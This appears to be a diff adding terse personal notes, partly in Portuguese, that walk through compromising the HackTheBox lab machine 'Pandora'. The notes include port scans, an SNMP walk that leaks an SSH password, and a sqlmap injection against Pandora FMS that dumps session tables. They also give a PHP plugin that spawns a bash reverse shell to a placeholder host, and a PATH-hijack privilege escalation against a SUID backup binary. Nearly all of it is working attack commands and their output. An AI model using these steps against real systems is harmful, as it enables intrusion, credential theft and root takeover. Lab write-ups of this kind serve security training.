@@ -1,0 +1,105 @@
+nmap -sC -sV -oA nmap 10.10.11.136 -p-
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-20 23:01 GMT
+Nmap scan report for panda.htb (10.10.11.136)
+Host is up (0.13s latency).                                                                                       
+Not shown: 65532 closed tcp ports (conn-refused)                                                                  
+PORT      STATE SERVICE     VERSION                                                                               
+22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                          
+| ssh-hostkey:                                                                                                    
+|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)                                                    
+|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)                                                   
+|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)                                                 
+80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))                                                        
+|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                      
+45545/tcp open  nagios-nsca Nagios NSCA                                                                           
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+
+Panda.HTB
+
+
+sudo nmap -sU --min-rate 5000 10.10.11.136
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 00:00 GMT
+Nmap scan report for panda.htb (10.10.11.136)
+Host is up (0.13s latency).
+Not shown: 993 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+161/udp   open   snmp
+1020/udp  closed unknown
+2222/udp  closed msantipiracy
+4008/udp  closed netcheque
+22109/udp closed unknown
+30704/udp closed unknown
+32815/udp closed unknown                                                                                          
+                                                                                                                  
+Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds                                                       
+                                                                                                                  
+snmpwalk -v 1 10.10.11.136 -c public                                                                              
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64" 
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10                                                              
+iso.3.6.1.2.1.1.3.0 = Timeticks: (219465) 0:36:34.65                                                              
+iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"                                                                            
+iso.3.6.1.2.1.1.5.0 = STRING: "pandora"                                                                           
+iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"                                                                       
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72                                                                                 
+                                                                                                                  
+snmpwalk -v2c -c public 10.10.11.136 . | tee snmp.output                                                          
+
+iso.3.6.1.2.1.25.4.2.1.5.1084 = STRING: "-u daniel -p HotelBabylon23"
+
+ssh daniel@10.10.11.136
+HotelBabylon23
+
+
+sudo ssh -N daniel@10.10.11.136 -L 8000:localhost:80
+
+http://127.0.0.1:8000/pandora_console/
+
+sqlmap --url="http://127.0.0.1:8000/pandora_console/include/chart_generator.php?session_id=''" -T 'tsessions_php' --dump
+
+
+s10ugd6so9j23ov8rb3i2k0cn9 admin phpsession
+
+Admin's Tools > Extension manager > extension uploader
+
+Criar um arquivo .php
+
+<?php
+
+/**
+*Plugin Name: Glrn Reverse Shell
+*Author: Glrn
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/x.x.x.x/4444 0>&1'");
+?>
+
+Zipar ele 
+zip glrn.php.zip glrn.php
+
+nc -vlp 4444
+
+
+linpeas
+
+ 20K -rwsr-x--- 1 root matt  17K Dec  3 15:58 /usr/bin/pandora_backup
+
+
+ cd /home/matt/.ssh
+
+ echo id_rsa.pub > authorized_keys
+
+ ssh -i id_rsa matt@10.10.11.136
+
+ no arquivo pandora_backup esta rodando tar
+
+ basta criar um fake e rodar ele
+
+ echo '/bin/bash;' > tar
+chmod +x tar
+export PATH=/home/matt:$PATH
+/usr/bin/pandora_backup
